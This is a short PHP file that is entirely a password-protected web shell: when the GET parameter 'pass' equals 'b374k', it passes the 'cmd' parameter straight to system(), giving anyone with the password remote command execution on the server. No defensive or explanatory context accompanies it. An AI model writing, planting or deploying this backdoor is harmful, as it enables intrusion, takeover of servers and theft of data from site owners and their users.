<?php
$shell_pass = "b374k";
if($_GET['pass'] === $shell_pass){
    system($_GET['cmd']);
}
?>
